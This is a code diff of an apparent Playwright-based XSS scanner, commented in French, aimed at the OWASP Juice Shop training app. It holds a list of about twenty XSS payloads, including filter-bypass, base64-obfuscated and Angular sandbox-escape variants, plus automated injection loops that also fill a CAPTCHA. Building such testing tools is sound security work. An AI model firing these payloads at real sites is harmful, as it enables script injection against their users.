@@ -138,10 +138,44 @@ _STATIC_EXT_RE = re.compile(
 # avec une petite liste de payloads connus pour contourner l'assainissement
 # Angular usuel, et on ne considère la vulnérabilité confirmée QUE si une
 # boîte de dialogue JS (alert/confirm/prompt) se déclenche réellement.
+# Liste élargie, curatée à partir de PayloadBox (payload-box/xss-payload-list
+# sur GitHub — Basic/event-handlers.txt, Basic/script-tags.txt et
+# Frameworks/angularjs.txt, adaptée pour Juice Shop). Volontairement bornée à
+# ~20 entrées plutôt que les milliers du dépôt complet : chaque payload coûte
+# une interaction navigateur réelle (remplissage + attente), donc un corpus
+# trop large rendrait le crawl impraticable. Diversité recherchée : tags de
+# base, gestionnaires d'évènement qui se déclenchent SANS interaction
+# supplémentaire (onerror/onload/onanimationend/onstart), variantes de casse
+# (contournement de filtre), échappement d'attribut, et payloads spécifiques
+# au framework Angular de la cible.
 DOM_XSS_PAYLOADS = [
-    '<iframe src="javascript:alert(`xss-poc`)">',
+    # Tags de base
+    '<script>alert(`xss-poc`)</script>',
+    '<ScRiPt>alert(`xss-poc`)</sCrIpT>',
     '<img src=x onerror=alert(`xss-poc`)>',
     '<svg onload=alert(`xss-poc`)>',
+    '<iframe src="javascript:alert(`xss-poc`)">',
+    # Gestionnaires d'évènement auto-déclenchés (pas besoin de clic/focus)
+    '<body onload=alert(`xss-poc`)>',
+    '<iframe onload=alert(`xss-poc`)></iframe>',
+    '<video src=x onerror=alert(`xss-poc`)></video>',
+    '<audio src=x onerror=alert(`xss-poc`)></audio>',
+    '<marquee onstart=alert(`xss-poc`)>x</marquee>',
+    '<style>@keyframes x{}</style><xss style="animation-name:x" '
+    'onanimationend=alert(`xss-poc`)></xss>',
+    # Échappement d'attribut (payload qui casse hors d'un attribut existant)
+    '"><script>alert(`xss-poc`)</script>',
+    "'><svg onload=alert(`xss-poc`)>",
+    # Contournement d'encodage / obfuscation basique
+    '<script>eval(atob("YWxlcnQoYHhzcy1wb2NgKQ=="))</script>',
+    '<script>setTimeout(function(){alert(`xss-poc`)},50)</script>',
+    # Ciblé Angular (Juice Shop) : tentatives d'évasion de sandbox de template
+    "{{constructor.constructor('alert(`xss-poc`)')()}}",
+    "<div ng-app ng-csp>{{x=1;x.toString.constructor('alert(`xss-poc`)')()}}</div>",
+    # Champs texte : déclencheurs liés à la frappe/au focus (utile puisque
+    # `_probe_dom_xss` remplit puis appuie sur Entrée sur le même champ)
+    '<input onfocus=alert(`xss-poc`) autofocus>',
+    '<textarea oninput=alert(`xss-poc`)>x</textarea>',
     # Payload spécifique attendu par le easter-egg "Bonus Payload" de Juice
     # Shop (défi xssBonusChallenge) : un embed vidéo précis, reconnu
     # côté serveur. Les payloads génériques ci-dessus ne le déclenchent pas.
@@ -195,6 +229,60 @@ def _solve_captcha(text: str) -> str | None:
 
 
 # --------------------------------------------------------------------------
+# Identification best-effort du sink DOM-XSS déclenché (voir _record_finding)
+# --------------------------------------------------------------------------
+_SINK_LABELS = {
+    r"\.innerHTML\s*=": "innerHTML (affectation directe)",
+    r"\.outerHTML\s*=": "outerHTML (affectation directe)",
+    r"document\.write\s*\(": "document.write()",
+    r"document\.writeln\s*\(": "document.writeln()",
+    r"\.insertAdjacentHTML\s*\(": "insertAdjacentHTML()",
+    r"eval\s*\(": "eval()",
+    r"setTimeout\s*\(\s*['\"]": "setTimeout() avec chaîne de code",
+    r"setInterval\s*\(\s*['\"]": "setInterval() avec chaîne de code",
+    r"location\.hash": "location.hash",
+    r"location\.search": "location.search",
+    r"\$\(.*\)\.html\s*\(": "jQuery .html()",
+}
+
+# Sink par défaut selon le vecteur, quand aucun pattern de `DOM_SINK_PATTERNS`
+# n'est retrouvé littéralement dans le HTML rendu (fréquent avec Angular : le
+# framework compile ses liaisons `[innerHTML]`/interpolation en code qui ne
+# contient plus la chaîne "innerHTML" telle quelle). Reste honnête : on décrit
+# le mécanisme probable plutôt que d'inventer une preuve qu'on n'a pas.
+_DEFAULT_SINK_BY_VECTOR = {
+    "DOM XSS": "Sink DOM implicite : liaison de template SPA (ex. Angular "
+               "[innerHTML] / interpolation) insérant la valeur du champ "
+               "dans le DOM rendu sans échappement.",
+    "Reflected XSS": "Sink DOM implicite : la route Angular consomme le "
+                      "paramètre d'URL et l'injecte dans le DOM rendu sans "
+                      "échappement au chargement de la page.",
+    "Persisted XSS": "Sink DOM implicite : la valeur relue depuis le "
+                      "serveur est réinjectée dans le DOM rendu sans "
+                      "échappement (template affichant la donnée stockée).",
+}
+
+
+async def _identify_sink(page: Page, vuln_type: str) -> str:
+    """
+    Best-effort : cherche un pattern de sink DOM-XSS connu (voir
+    DOM_SINK_PATTERNS) dans le HTML actuellement rendu par le navigateur, au
+    moment où l'exécution vient d'être confirmée. Si un pattern littéral est
+    retrouvé, on le nomme précisément ; sinon on retombe sur une description
+    générique honnête du mécanisme probable (voir _DEFAULT_SINK_BY_VECTOR).
+    """
+    try:
+        content = await page.content()
+    except Exception:
+        content = ""
+
+    for pattern, label in _SINK_LABELS.items():
+        if re.search(pattern, content):
+            return label
+    return _DEFAULT_SINK_BY_VECTOR.get(vuln_type, "Sink DOM non identifié précisément.")
+
+
+# --------------------------------------------------------------------------
 # Crawler
 # --------------------------------------------------------------------------
 class PlaywrightCrawler:
@@ -228,9 +316,14 @@ class PlaywrightCrawler:
         # global d'essais pour couvrir plusieurs pages/champs sans spammer
         # la cible ni ralentir excessivement le crawl.
         self._dialog_fired = False
-        self._dom_probe_budget = 15
-        self._form_probe_budget = 10
-        self._reflected_probe_budget = 8
+        # Budgets relevés pour couvrir tout le corpus DOM_XSS_PAYLOADS (~20
+        # payloads) sur plusieurs champs/pages, au lieu de s'arrêter au
+        # premier payload qui fonctionne (voir _probe_dom_xss/_probe_
+        # reflected_xss/_probe_persisted_forms) — demande explicite : tester
+        # large plutôt qu'un seul payload par point d'injection.
+        self._dom_probe_budget = 60
+        self._form_probe_budget = 30
+        self._reflected_probe_budget = 30
         # Compte jetable créé via _register_and_login() : de nombreuses pages
         # (profil, feedback avec auteur pré-rempli, menu compte...) ne sont
         # accessibles/pertinentes qu'après authentification et sont sinon
@@ -525,11 +618,64 @@ class PlaywrightCrawler:
         except Exception:
             pass
 
+    @staticmethod
+    async def _snap(page: Page, label: str) -> dict[str, str] | None:
+        """Capture un screenshot labellisé (best-effort, jamais bloquant)."""
+        try:
+            raw = await page.screenshot(full_page=False)
+        except Exception:
+            return None
+        return {"label": label, "image_b64": base64.b64encode(raw).decode("ascii")}
+
+    @staticmethod
+    async def _annotate_confirmed(page: Page) -> None:
+        """
+        Incruste un bandeau visuel avant la capture "résultat".
+
+        Un dialogue JS natif (alert/confirm/prompt) — la preuve d'exécution
+        elle-même — n'apparaît JAMAIS sur une capture d'écran Playwright
+        (c'est un élément de chrome du navigateur, pas du contenu de la
+        page) : sans ce bandeau, la capture "résultat" ressemblerait
+        souvent trait pour trait à la capture "avant", ce qui ne prouve
+        visuellement rien. Cette annotation est ajoutée APRÈS coup par
+        l'outil pour illustrer le rapport ; elle ne fait pas partie du
+        payload testé (qui reste inchangé, voir le champ "payload").
+        """
+        try:
+            await page.evaluate(
+                """() => {
+                    const id = '__xss_poc_confirmed_banner__';
+                    if (document.getElementById(id)) return;
+                    const b = document.createElement('div');
+                    b.id = id;
+                    b.textContent = '✅ XSS CONFIRME — une boite de dialogue JS '
+                        + '(alert/confirm/prompt) vient de se declencher ici. Les dialogues '
+                        + 'natifs du navigateur ne peuvent pas apparaitre sur une capture '
+                        + 'd\\'ecran : ce bandeau, ajoute par l\\'outil apres coup, marque le '
+                        + 'moment de l\\'execution.';
+                    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;'
+                        + 'background:#c0392b;color:#fff;font:bold 13px/1.5 sans-serif;'
+                        + 'padding:10px 18px;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.5);';
+                    (document.body || document.documentElement).appendChild(b);
+                }"""
+            )
+        except Exception:
+            pass
+
     async def _record_finding(
         self, page: Page, base_url: str, payload: str, parameter: str,
-        vuln_type: str, note: str,
+        vuln_type: str, note: str, source: str = "",
+        extra_shots: list[dict[str, str]] | None = None,
     ) -> None:
-        """Factorise l'enregistrement d'une découverte XSS confirmée par exécution."""
+        """
+        Factorise l'enregistrement d'une découverte XSS confirmée par exécution.
+
+        `extra_shots` : captures déjà prises par l'appelant AVANT ce point
+        (ex : page avant injection, champ rempli avec le payload visible) —
+        on y ajoute systématiquement une dernière capture "résultat" prise
+        ici, pour obtenir une séquence complète avant/injection/résultat
+        plutôt qu'une unique image de la fin.
+        """
         # Le même sondage (ex : recherche) s'exécute sur chaque page visitée
         # (barre de recherche présente partout) : sans dédoublonnage, une
         # unique vulnérabilité apparaîtrait une fois par page dans le
@@ -541,11 +687,14 @@ class PlaywrightCrawler:
         if dedup_key in self._finding_keys:
             return
         self._finding_keys.add(dedup_key)
-        try:
-            screenshot_bytes = await page.screenshot(full_page=False)
-            screenshot_b64 = base64.b64encode(screenshot_bytes).decode("ascii")
-        except Exception:
-            screenshot_b64 = ""
+
+        screenshots = list(extra_shots or [])
+        await self._annotate_confirmed(page)
+        result_shot = await self._snap(page, "Résultat (exécution confirmée — bandeau ajouté par l'outil)")
+        if result_shot:
+            screenshots.append(result_shot)
+
+        sink = await _identify_sink(page, vuln_type)
         self.result.dom_xss_findings.append({
             "tool": "playwright-dom-probe",
             "type": vuln_type,
@@ -554,12 +703,24 @@ class PlaywrightCrawler:
             "parameter": parameter,
             "payload": payload,
             "context": "DOM — rendu côté client (SPA)",
+            "source": source or f"Champ/paramètre '{parameter}'",
+            "sink": sink,
             "evidence": "Boîte de dialogue JS déclenchée dans un vrai navigateur",
             "confidence": "high",
             "cwe": "CWE-79",
             "confirmed": True,
-            "screenshot_b64": screenshot_b64,
+            "screenshot_b64": screenshots[-1]["image_b64"] if screenshots else "",
+            "screenshots": screenshots,
             "verification_note": note,
+            "reproduction_url": page.url if page.url else "",
+            "reproduction_steps": [
+                f"Source : {source or f'champ/paramètre {parameter!r}'} — c'est "
+                "par là que la donnée attaquant-contrôlée entre dans l'application.",
+                f"Sink : {sink} — c'est là que cette donnée est utilisée de "
+                "façon dangereuse (insérée dans le DOM sans échappement).",
+                f"Payload : {payload}",
+                f"Résultat observé : {note}",
+            ],
         })
 
     async def _probe_dom_xss(self, page: Page, base_url: str) -> None:
@@ -588,6 +749,7 @@ class PlaywrightCrawler:
         for inp in inputs[:2]:
             if self._dom_probe_budget <= 0:
                 break
+            before_shot = await self._snap(page, "Avant injection (champ vide)")
             for payload in DOM_XSS_PAYLOADS:
                 if self._dom_probe_budget <= 0:
                     break
@@ -595,21 +757,28 @@ class PlaywrightCrawler:
                 self._dialog_fired = False
                 try:
                     await inp.fill(payload)
+                    injection_shot = await self._snap(
+                        page, "Payload saisi dans le champ (avant validation)"
+                    )
                     await inp.press("Enter")
                     await page.wait_for_timeout(1000)
                 except Exception:
                     continue
 
                 if self._dialog_fired:
+                    shots = [s for s in (before_shot, injection_shot) if s]
                     await self._record_finding(
                         page, base_url, payload, "champ de recherche / texte",
                         "DOM XSS",
                         "Payload injecté directement dans le champ de saisie et "
                         "exécuté par le rendu JS de la page (alert() déclenché).",
+                        source="Champ de saisie utilisateur (recherche/texte, frappe directe)",
+                        extra_shots=shots,
                     )
-                    # Un payload confirmé suffit pour ce champ : inutile de
-                    # continuer à spammer la cible avec les autres payloads.
-                    break
+                    # On continue avec les payloads suivants (demande
+                    # explicite : tester large plutôt que s'arrêter au
+                    # premier succès) — seul le budget global fait s'arrêter
+                    # la boucle, pas un premier résultat positif.
 
     async def _probe_reflected_xss(self, page: Page, base_url: str) -> None:
         """
@@ -643,8 +812,11 @@ class PlaywrightCrawler:
         # l'étiquette de `base_url` dans les étapes suivantes du crawl. On
         # restaure systématiquement la page d'origine avant de rendre la
         # main, succès ou non.
+        before_shot = await self._snap(page, "Avant injection (page d'origine)")
         try:
-            for payload in DOM_XSS_PAYLOADS[:3]:
+            # Tout le corpus (borné par le budget global, pas par un premier
+            # succès) : demande explicite de tester large sur ce vecteur.
+            for payload in DOM_XSS_PAYLOADS:
                 if self._reflected_probe_budget <= 0:
                     break
                 self._reflected_probe_budget -= 1
@@ -666,8 +838,9 @@ class PlaywrightCrawler:
                         "Payload placé directement dans le paramètre d'URL 'q' "
                         "(sans passer par le champ de saisie) et exécuté par le "
                         "rendu JS de la route Angular au chargement de la page.",
+                        source="Paramètre d'URL 'q' (GET, injecté sans passer par l'UI)",
+                        extra_shots=[before_shot] if before_shot else None,
                     )
-                    break
         finally:
             if page.url != base_url:
                 await self._goto_resilient(page, base_url)
@@ -685,84 +858,142 @@ class PlaywrightCrawler:
         n'apparaît qu'après un aller-retour serveur (valeur relue depuis la
         base). C'est pourtant le vecteur des défis "Persisted XSS" de Juice
         Shop (nom d'utilisateur, commentaire de feedback).
+
+        Chaque essai coûte un aller-retour serveur complet (soumission +
+        rechargement), bien plus cher que `_probe_dom_xss` : on teste donc un
+        sous-ensemble représentatif du corpus (pas la totalité) plutôt que de
+        s'arrêter au tout premier payload comme avant.
         """
         if self._form_probe_budget <= 0:
             return
-        try:
-            fields = await page.query_selector_all(
-                "input[type='text']:not([id*='search' i]):not([name*='search' i]), "
-                "input:not([type]):not([id*='search' i]), textarea"
-            )
-        except Exception:
-            return
-        if not fields:
-            return
 
-        # Résout le CAPTCHA du formulaire de feedback si présent (défi
-        # persistedXssFeedbackChallenge) — sans quoi la soumission échoue
-        # silencieusement et le champ "comment" n'est jamais persisté.
-        captcha_input = await page.query_selector("#captchaControl")
-        if captcha_input:
+        candidates = DOM_XSS_PAYLOADS[:6]
+        for attempt, payload in enumerate(candidates):
+            if self._form_probe_budget <= 0:
+                break
+
+            if attempt > 0:
+                # Repartir d'un formulaire propre avant chaque nouveau payload.
+                try:
+                    await self._goto_resilient(page, base_url)
+                    await page.wait_for_timeout(500)
+                    await self._dismiss_overlays(page)
+                except Exception:
+                    break
+
             try:
-                body_text = await page.evaluate("document.body.innerText")
-                answer = _solve_captcha(body_text)
-                if answer is not None:
-                    await captcha_input.fill(answer)
+                fields = await page.query_selector_all(
+                    "input[type='text']:not([id*='search' i]):not([name*='search' i]), "
+                    "input:not([type]):not([id*='search' i]), textarea"
+                )
+            except Exception:
+                continue
+            if not fields:
+                return  # Pas de formulaire pertinent sur cette page : inutile d'insister.
+
+            # Résout le CAPTCHA du formulaire de feedback si présent (défi
+            # persistedXssFeedbackChallenge) — sans quoi la soumission échoue
+            # silencieusement et le champ "comment" n'est jamais persisté.
+            captcha_input = await page.query_selector("#captchaControl")
+            if captcha_input:
+                try:
+                    body_text = await page.evaluate("document.body.innerText")
+                    answer = _solve_captcha(body_text)
+                    if answer is not None:
+                        await captcha_input.fill(answer)
+                except Exception:
+                    pass
+
+            # Idem pour un éventuel slider de note requis (ex : formulaire de
+            # feedback) : sans valeur, le formulaire reste invalide et le
+            # bouton de soumission désactivé.
+            try:
+                slider = await page.query_selector("mat-slider, input[type='range']")
+                if slider:
+                    await slider.click(timeout=1000)
+                    await page.keyboard.press("End")
+                    await page.wait_for_timeout(150)
             except Exception:
                 pass
 
-        # Idem pour un éventuel slider de note requis (ex : formulaire de
-        # feedback) : sans valeur, le formulaire reste invalide et le bouton
-        # de soumission désactivé.
-        try:
-            slider = await page.query_selector("mat-slider, input[type='range']")
-            if slider:
-                await slider.click(timeout=1000)
-                await page.keyboard.press("End")
-                await page.wait_for_timeout(150)
-        except Exception:
-            pass
+            before_shot = await self._snap(page, "Avant injection (formulaire vide)")
 
-        payload = DOM_XSS_PAYLOADS[0]
-        tested_any = False
-        for field in fields[:3]:
-            if self._form_probe_budget <= 0:
-                break
-            try:
-                if not await field.is_visible() or not await field.is_enabled():
-                    continue
-                field_type = (await field.get_attribute("type")) or ""
-                if field_type in ("email", "password", "hidden", "file", "checkbox", "radio"):
-                    continue
-            except Exception:
-                continue
-            self._form_probe_budget -= 1
-            tested_any = True
-            try:
-                await field.fill(payload)
-            except Exception:
-                continue
-
-        if not tested_any:
-            return
-
-        self._dialog_fired = False
-        submitted = False
-        for sel in (
-            "button[type='submit']", "#submitButton", "#submit",
-            "button[aria-label*='save' i]", "button[aria-label*='send' i]",
-        ):
-            try:
-                btn = await page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click(timeout=1500)
-                    submitted = True
+            tested_any = False
+            for field in fields[:3]:
+                if self._form_probe_budget <= 0:
                     break
+                try:
+                    if not await field.is_visible() or not await field.is_enabled():
+                        continue
+                    field_type = (await field.get_attribute("type")) or ""
+                    if field_type in ("email", "password", "hidden", "file", "checkbox", "radio"):
+                        continue
+                except Exception:
+                    continue
+                self._form_probe_budget -= 1
+                tested_any = True
+                try:
+                    await field.fill(payload)
+                except Exception:
+                    continue
+
+            if not tested_any:
+                continue
+
+            injection_shot = await self._snap(page, "Payload saisi dans le formulaire (avant soumission)")
+            probe_shots = [s for s in (before_shot, injection_shot) if s]
+
+            self._dialog_fired = False
+            submitted = False
+            for sel in (
+                "button[type='submit']", "#submitButton", "#submit",
+                "button[aria-label*='save' i]", "button[aria-label*='send' i]",
+            ):
+                try:
+                    btn = await page.query_selector(sel)
+                    if btn and await btn.is_visible():
+                        await btn.click(timeout=1500)
+                        submitted = True
+                        break
+                except Exception:
+                    continue
+            if not submitted:
+                continue
+            await page.wait_for_timeout(1000)
+
+            if self._dialog_fired:
+                await self._record_finding(
+                    page, base_url, payload, "champ de formulaire (persisté)",
+                    "Persisted XSS",
+                    "Payload soumis via un formulaire et exécuté immédiatement "
+                    "après enregistrement (rendu non échappé de la valeur).",
+                    source="Champ de formulaire soumis (POST, persisté côté serveur)",
+                    extra_shots=probe_shots,
+                )
+                continue
+
+            # Le rendu non échappé peut n'apparaître qu'après relecture
+            # depuis le serveur (ex : nom d'utilisateur affiché ailleurs
+            # après reload).
+            after_submit_shot = await self._snap(page, "Après soumission (avant rechargement)")
+            try:
+                await self._goto_resilient(page, base_url)
+                self._dialog_fired = False
+                await page.wait_for_timeout(1500)
             except Exception:
                 continue
-        if not submitted:
-            return
-        await page.wait_for_timeout(1000)
+
+            if self._dialog_fired:
+                shots = probe_shots + ([after_submit_shot] if after_submit_shot else [])
+                await self._record_finding(
+                    page, base_url, payload, "champ de formulaire (persisté)",
+                    "Persisted XSS",
+                    "Payload soumis via un formulaire ; l'exécution ne s'est "
+                    "déclenchée qu'après rechargement de la page (valeur relue "
+                    "stockée côté serveur, rendue sans échappement).",
+                    source="Champ de formulaire soumis (POST, persisté côté serveur, relu au reload)",
+                    extra_shots=shots,
+                )
 
         # La soumission peut avoir navigué `page` ailleurs qu'sur `base_url`
         # (formulaire "legacy" en POST HTML classique, ex : /profile). Comme
@@ -770,41 +1001,12 @@ class PlaywrightCrawler:
         # partagé sur `base_url` avant de rendre la main au crawl BFS, pour
         # ne pas fausser l'extraction de formulaires/liens de l'étape
         # suivante.
-        try:
-            if self._dialog_fired:
-                await self._record_finding(
-                    page, base_url, payload, "champ de formulaire (persisté)",
-                    "Persisted XSS",
-                    "Payload soumis via un formulaire et exécuté immédiatement "
-                    "après enregistrement (rendu non échappé de la valeur).",
-                )
-                return
-
-            # Le rendu non échappé peut n'apparaître qu'après relecture
-            # depuis le serveur (ex : nom d'utilisateur affiché ailleurs
-            # après reload).
+        if page.url != base_url:
             try:
                 await self._goto_resilient(page, base_url)
-                self._dialog_fired = False
-                await page.wait_for_timeout(1500)
+                await page.wait_for_timeout(300)
             except Exception:
-                return
-
-            if self._dialog_fired:
-                await self._record_finding(
-                    page, base_url, payload, "champ de formulaire (persisté)",
-                    "Persisted XSS",
-                    "Payload soumis via un formulaire ; l'exécution ne s'est "
-                    "déclenchée qu'après rechargement de la page (valeur relue "
-                    "stockée côté serveur, rendue sans échappement).",
-                )
-        finally:
-            if page.url != base_url:
-                try:
-                    await self._goto_resilient(page, base_url)
-                    await page.wait_for_timeout(300)
-                except Exception:
-                    pass
+                pass
 
     async def _detect_dom_sinks(self, page: Page, base_url: str) -> list[DomSink]:
         """Analyse le HTML rendu + les scripts inline pour repérer des sinks."""
